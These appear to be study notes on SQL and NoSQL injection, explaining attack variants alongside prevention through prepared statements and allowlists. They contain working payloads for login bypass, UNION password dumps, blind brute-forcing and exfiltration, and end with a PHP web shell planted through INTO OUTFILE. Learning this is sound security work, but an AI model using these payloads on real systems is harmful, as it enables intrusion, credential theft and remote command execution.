A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. 

This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the
database, and RCE in some cases.


so here the user input is taken as code and dynamically altered the program's logic.

## PREVENTION

sql injection happens when user parameters are received and injected into query which may alter the program's logic. 

Example , there is a login page which takes input username and password 

The query the web app make when the input fields are filled will be like, 

```sql
SELECT Id FROM Users WHERE Username='vickie' AND Password='password123';
```

So what is the problem here? 

Sql have many special characters which we can use to mess with the program's logic.

For example,

Firing up burp and modifying the request to 
```http
username="admin';-- "&password=password123
```

Here `--` character denotes the start of an sql comment, so effectively the rest of the query is cancelled out and becomes,

```sql
SELECT Id FROM Users WHERE Username='admin';
```

In such a way attacker can bypass the login.

Not only that, Attackers can also get data that they shouldn't be allowed to see,

For example,

`Normal scenario:` 
```http
GET /emails?username=vickie&accesskey=ZB6w0YLjzvAVmp6zvr
Host: example.com
```

This is a get request where user provides username and access key to prove their identity,

The sql query will be like,

```sql
SELECT Title, Body FROM Emails WHERE username='vickie'AND AccessKey='ZB6w0YLjzvAVmp6zvr';
```

`Attacker's scenario:`
```http
GET /emails?username=vickie&accesskey="ZB6w0YLjzvAVmp6zvr'UNION+SELECT+Username,Password+FROM+Users;--"
Host: example.com
```

This will be the new query where attacker can see username and password of all users,

```sql
SELECT Title, Body FROM Emails WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr' UNION SELECT Username, Password FROM Users;-- ;
```

Other than SELECT ,  other statements are also used in SQL Injection:
- UPDATE
- INSERT 
- DELETE 
- Etc

For example  a scenario where we can update our password,

`Normal scenario:`
```http
POST /change_password
Host: example.com
(POST request body)
new_password=password12345
```

This will be queried to:
```sql
UPDATE Users SET Password='password12345' WHERE Id = 2;
```

`Attacker's senario:`
```http
POST /change_password
Host: example.com
(POST request body)
new_password="password12345';--"
```

Will be changed to :

```sql
UPDATE Users SET Password='password12345';-- WHERE Id = 2;
```

Here id = 2 is commented out, therefore all passwords in the user table will be changed to "password 12345" in this way attacker can log in as any user.


###### Using Second-Order SQL Injections

The first order sql injection happens when the application uses the user input directly to the sql  query. 

The second order sql injection happens when, a user input is stored in the database and used unsafely in an sql query.

Example:

Here a user can specify username and password to create an account.

`Attacker:`
```http
POST /signup
Host: example.com
(POST request body)
username="test' UNION SELECT Username, Password FROM Users;--"&password=password123 
```


This request submits  the username as `test' UNION SELECT Username,Password FROM Users;--`

This will select all the username and password in database and return it. The web app successfully validate the user input using it's protection techniques.

So `test' UNION SELECT Username,Password FROM Users;--` is stored into database as string instead of misinterpreting with the web app.

Let's imagine the user access their email by giving a get request,
```http
GET /emails
Host: example.com
```

Suppose in this case if the user doesn't provide a username or password, 

The application will get currently logged in username. It goes like, 

```sql
SELECT Title, Body FROM Emails WHERE Username='CURRENT_LOGGED_IN_USERNAME'
```

But here in this case the username contains an sql query which will result in,


```sql
SELECT Title, Body FROM Emails
WHERE Username='test'
UNION SELECT Username, Password FROM Users;--
```

This will return all usernames and passwords as email tittles and body  in http response

This is second-order sql injection.

###### Prevention

One way to prevent sql injection is to use `prepared statements`.

Before that let's look at the life cycle of sql injection,
![Screenshot 2023-11-01 at 9.34.48 AM.png](Screenshot%202023-11-01%20at%209.34.48%E2%80%AFAM.png)

Here user input is taken it is send to server, it is compiled, optimised ans parsed there.

And execution happens then results are returned. So basically the user input into sql queries will dynamically rewrite the program, and alters it's logic.

But prepared statements ensure that the user input does not change the program logic, 

It is done by getting sql statements compiled by the server before any user input is received.

Ie, send sql statements to server, compile it , and insert user supplied parameters right before execution.
![Screenshot 2023-11-01 at 9.42.11 AM.png](Screenshot%202023-11-01%20at%209.42.11%E2%80%AFAM.png)


regardless of what the user input is,  it will only be treated as string and not code. This will allow the database to distinguish between code and user input.

`Example:`

A user wants to retrive user id using username and password, the  sql query will be like,

```sql
SELECT Id FROM Users WHERE Username=USERNAME AND Password=PASSWORD;
```

The same in php,
```php
$mysqli = new mysqli("mysql_host", "mysql_username", "mysql_password", "database_name"); 
$username = $_POST["username"]; 
$password = $_POST["password"]; 
```

Here  we first establish a connection with our database, then retrieve username and password  as post parameters from user,

To use the prepared statements , you would define the structure of the query first. 

We'll write-out the query without the parameters and put question marks as placeholders for the parameters like this:

```php
$stmt = $mysqli -> prepare("SELECT Id FROM Users WHERE Username=? AND Password=?");
```

Now we can send the parameters of the query separately like this:

```php
$stmt -> bind_param("ss", $username, $password);
```

Finally execute it,

```php
$stmt -> execute();
```

Here the user can't mess with the program's logic as the compilation happened in the first and then user input is taken.

For example even if the user give an input,
`Password12345';--` this entire input will be treated like plain text.


Another way of preventing SQL Injection is to use an allow list.

For example, the SQL ORDER BY clause allows a query to specify the column by which to sort the result. 

Therefore, this query will return all of the user’s emails in our table, sorted by the Date column, in descending order:

```sql
SELECT Title, Body FROM Emails WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'; ORDER BY Date DESC;
```

If the application allows users to specify a column to use for ordering their email,

it can rely on an allowlist of column names for the ORDER BY
clause instead of allowing an input from the user.

For example, the application can allow only the values Date, Sender, and Title, and reject all other user-input values.

###### Hunting for SQL Injections

whatever sql injection we are performing first start with  this symbol : `'` if the user input is taken correctly then ,  this will be treated as plain text.

Else any anomalies happen or any logic flaw or error happens it is parsed into code.

###### Classic sql injection

Classic SQL injections are the easiest to find and exploit. In classic SQL injections, the results of the SQL query are returned directly to the attacker in an HTTP response.

There are two subtypes: UNION based and error based.

Our email example earlier is a case of the UNION-based approach: an attacker uses the UNION operator to concatenate the results of another query onto the web application’s response

###### Error based sql injection

Error-based SQL injection attacks trigger an error in the database to collect information from the returned error message. 

For example, 
we can induce an error by using the `CONVERT()` function in MySQL:

```sql
SELECT Title, Body FROM Emails WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr' UNION SELECT 1,
CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE); –-
```

The `CONVERT(VALUE, FORMAT)` function attempts to convert VALUE to the format specified by FORMAT, here it is  DATE.

Therefore, this query will force the database to convert the admin’s password to a date format, which can sometimes cause the database to throw a descriptive error like this one:

Conversion failed when trying to convert `"t5dJ12rp$fMDEbSWz"` to data type "date".

###### Look for Blind SQL Injections

Blind sql injection happens when the web app doesn't return sql data or descriptive error messages.

Here we can do it by observing it's behaviour. Blind sql have two types,
- Boolean 
- Time based 


###### Boolean  SQLi

Boolean-based SQL injection occurs when,  attackers find the structure of the database by injecting test conditions into the SQL query that will return either true or false.

Using those responses, attackers could slowly find the
contents of the database.

For example,

Imagine there is a web app that identifies premium users and  separates them.

The site determines who is premium by using a cookie that contains the user’s ID and matching it against a table of registered premium members.

```http
GET /
Host: example.com
Cookie: user_id=2
```

This will turn into:
```sql
SELECT * FROM PremiumUsers WHERE Id='2';
```


If this query returns data, the user is a premium member, and the Welcome, premium member! banner will be displayed. 

Otherwise, the banner won’t be displayed. Let’s say your account isn’t premium. What would happen if you submit this user ID instead?

`User id payload:`
```sql
2' UNION SELECT Id FROM Users WHERE Username = 'admin' and SUBSTR(Password, 1, 1) ='a';--
```

This payload  will become,
```sql
SELECT * FROM PremiumUsers WHERE Id='2' UNION SELECT Id FROM Users WHERE Username = 'admin'
and SUBSTR(Password, 1, 1) = 'a';--
```


The `SUBSTR(STRING, POSITION, LENGTH)` function extracts a substring from the STRING, of a specified LENGTH, at the specified POSITION in that string.

Therefore, `SUBSTR(Password, 1, 1)`  returns the first character of each user’s password. 

Since user 2 isn’t a premium member, whether this query returns data will depend on the second SELECT statement, which returns data if the admin account’s password starts with an a. 

This means you can brute-force the admin’s password; if you submit this user ID as a cookie, 

the web application would display the premium banner if the admin account’s password starts with an a. 

You could try this query with the letters b, c, and so on,
until it works.

###### Time based SQLi

Time based sql injection is similar, but here we look for the time taken for response.

For example,

There is no way to differentiate b/w premium and ordinary user like a welcome premium user, banner in the page.

So we observe time in here.

`The user id payload:`
```sql
2' UNION SELECT IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0) Password FROM Users WHERE Username = 'admin';
```

This submission will be translated to sql query like,
```sql
SELECT * FROM PremiumUsers WHERE Id='2' UNION SELECT IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0) Password FROM Users WHERE Username = 'admin';
```

Here if the admin's  password starts with 'a' the database will sleep for 10 second. This could be used for brute-force of password.


###### Exfiltrate Information by Using SQL Injections

Imagine a scenario where the input  we enter isn't used right away, 

But it is used in a backend operation, therefore we do not not have any way to retrieve http response,

Observing time delays is also not a viable option here,
In this case,

We need  to make the database store information somewhere when it does the execution.

In MySQL, the SELECT. . .INTO statement tells the database to store the results of a query in an output file on the local machine.


The query will be like,
```sql
SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt'
```


Then we can simply access the information by navigating into `https://example.com/output.txt` 



Say that when you browse example.com, the application adds you to a database table to keep track of currently
active users. 


Accessing a page with a cookie, like this

```
GET /
Host: example.com
Cookie: user_id=2, username=test

```

will cause the application to add you to a table of active users. 

In this example,

the ActiveUsers table contains only two columns: one for the user ID and one for the username of the logged-in user. 


The application uses an INSERT statement to add you to the ActiveUsers table. 

INSERT statements add a row into the specified table with the specified values:

```sql
INSERT INTO ActiveUsers VALUES ('2', 'test');
```

In this case, an attacker can craft a malicious cookie to inject into the INSERT statement:

```http
GET /
Host: example.com
Cookie: user_id="2', (SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/ www/html/output.txt '));-- ", username=test

```

This cookie  will, in turn, cause the INSERT statement to save the admin’s password into the output.txt file on the victim server:

```sql
INSERT INTO ActiveUsers VALUES ('2', (SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/ www/html/output.txt '));-- ', 'test');
```


Finally, you will find the password of the admin account stored into the output.txt file on the target server.


###### Look for NoSQL Injections


No sql injection just mean that, it does not use a relational database system like tables, which is common for MySQL, post-gre SQL etc, 

But in here NoSql uses key-value pairs , graphs etc to store data this is the key difference between these two.

Modern NoSQL databases, such as MongoDB, Apache CouchDB, and Apache Cassandra, are also vulnerable to injection attacks

Take MongoDB, for example,

In MongoDB syntax, 
`Users.find()`: returns users that meet a certain criteria. 

For example, 
the following query returns users with the username vickie and the password password123:

```SQL
Users.find({username: 'vickie', password: 'password123'});
```

If the application uses this functionality to log in users and populates the database query directly with user input, like this:

```sql
Users.find({username: $username, password: $password});

```
attackers can submit the password `{$ne: ""}` to log in as anyone. 

For example,

let’s say that the attacker submits a username of admin and a password of `{$ne: ""}`. 

The database query would become as follows:

```sql
Users.find({username: 'admin', password: {$ne: ""}});
```

In MongoDB, `$ne` selects objects whose value is not equal to the specified value. 

Here, the query would return users whose username is admin and password isn’t equal to an empty string, 

which is true unless the admin has a blank password! The attacker can thus bypass authentication and gain access to the admin account.


In MongoDB, the `$where, mapReduce, $accumulator,` and `$function` operations allow developers to run arbitrary
JavaScript. 


For example, 

you can define a function within the `$where` operator to find users named test:

```sql
Users.find( { $where: function() {
   return (this.username == 'vickie') } } );
```

Say the developer allows unvalidated user input in this function and uses that to fetch account data, like this:

```sql
Users.find( { $where: function() {
   return (this.username == $user_input) } } );
```

In that case, an attacker can execute arbitrary JavaScript code by injecting it into the $where operation. 

For example, 

the following piece of malicious code will launch a denial-of-service (DoS) attack by triggering a
never-ending while loop:

```sql
Users.find( { $where: function() {
  return (this.username == 'test'; while(true){};) } } );
```


You can insert special characters such as quotes (`' "`), semi-colons (`;`), and backslashes (`\`), as well as parentheses (`()`), brackets(`[]`), and braces (`{}`) into user-input fields and look for errors or other anomalies.

You can also automate the hunting process by using the tool `NoSQLMap` ===> `(https://github.com/codingo/NoSQLMap/)`.



Developers can prevent NoSQL injection attacks by :

- validating user input and avoiding dangerous database functionalities. 

- In MongoDB, you can disable the running of server-side JavaScript by using the `--noscripting` option in the command line 

- `security.javascriptEnabled flag` in the configuration file to false. 

- Additionally, you should follow the principle of least privilege when assigning rights to applications. 

This means that applications should run with only the privileges they require to operate. 

For example, when an application requires only read access to a file, it should not be granted any write or execute permissions. 

This will lower your risk of complete system compromise during an attack.

###### Escalating the Attack

###### Gain a Web Shell

To escalate SQL injections ,
attempt to gain a web shell on the server. 

Let’s say we’re targeting a PHP application. The following piece of PHP code will take the request parameter named cmd and execute it as a

system command:

```php
<? system($_REQUEST['cmd']); ?>
```

You can use the SQL injection vulnerability to upload this PHP code to a location that you can access on the server by using `INTO OUTFILE`. 

For example, you can write the password of a nonexistent user and the PHP code

```php
<? system($_REQUEST['cmd']); ?> 
```

into a file located at /var/ www/html/shell.php on the target server:

```sql
SELECT Password FROM Users WHERE Username='abc'
UNION SELECT "<? system($_REQUEST['cmd']); ?>"
INTO OUTFILE "/var/www/html/shell.php"
```

Since the password of the nonexistent user will be blank, you are essentially uploading the PHP script to the shell.php file. 

Then you can simply access your shell.php file and execute any command you wish: `http://www.example.com/shell.php?cmd=COMMAND`